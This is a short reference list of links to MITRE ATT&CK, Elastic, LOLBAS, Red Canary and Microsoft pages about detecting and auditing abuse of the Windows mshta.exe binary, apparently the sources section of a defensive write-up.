- MITRE ATT&CK — System Binary Proxy Execution: Mshta (T1218.005): https://attack.mitre.org/techniques/T1218/005/
- MITRE ATT&CK — Defense Evasion tactic (TA0005): https://attack.mitre.org/tactics/TA0005/
- MITRE ATT&CK — Execution tactic (TA0002): https://attack.mitre.org/tactics/TA0002/
- Elastic — prebuilt rule "Suspicious HTML Application (mshta) child process" reference: https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/defense_evasion_mshta_child_process
- LOLBAS — Mshta.exe: https://lolbas-project.github.io/lolbas/Binaries/Mshta/
- Red Canary — Mshta threat detection: https://redcanary.com/threat-detection-report/techniques/mshta/
- Microsoft Learn — Command line process auditing (Event 4688 command-line GPO): https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing
